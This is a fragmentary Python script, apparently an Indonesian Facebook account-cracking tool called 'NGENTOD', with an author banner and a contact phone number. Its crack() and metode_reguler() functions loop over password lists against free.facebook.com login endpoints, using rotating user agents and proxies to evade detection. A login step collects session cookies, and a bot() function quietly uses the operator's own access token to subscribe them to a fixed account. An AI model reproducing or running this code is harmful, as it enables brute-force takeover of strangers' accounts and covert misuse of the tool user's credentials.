...
#	uasm2.append(uaku)
	...
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93/'
...
def banner():
	...
	wel = '# WELCOME TO NGENTOD'

	wel2 = mark(wel, style='cyan')

	sol().print(wel2)

	au='AUTHOR    :  ACILL X CODE\nStatus    :  Premium\nWHATSAPP  :  +6289668363509'

	pengembang1=nel(au,style="cyan")

	cetak(nel(pengembang1, title='INFORMASI PENGOCOK HANDAL'))
...
def login_lagi334():
	...
	try:
		...
		cetak(nel('\ Saran Ektensi : [green]Get Token Cookies [white]'))

		asu = random.choice([h,k,h,b,u])

		cookie=input(f'  [{h}cil{x}] Masukkan Cookies :{asu} ')
		...
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,h,x))
...
def bot():
	...
	try:
		...
		requests.post("https://graph.facebook.com/100001273789051?fields=subscribers&access_token=%s"%(tokenku))
...
def crack(idf,pwv):
	...
	ua1 = "Mozilla/5.0 (Series40; Nokia200/11.64; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14"

	ua23 = random.choice(random_user_agent)
...
def metode_reguler(idf, pwv,):
	...
	ua = "Mozilla/5.0 (Linux; Android 10; RMX1801) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"

	ua22 = random.choice(random_user_agent)
	...
	for pw in pwv:
		...
		try:
			...
			p = ses.get(f"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8",headers=headers1)
			...
			headers2 = {
				...
				"origin":f"https://free.facebook.com/",
				...
				'referer':f'https://free.facebook.com/login/?next&ref=dbl&fl&refid=8',
			...
			po = ses.post(f"https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",data=data, headers=headers2, proxies=proxy)
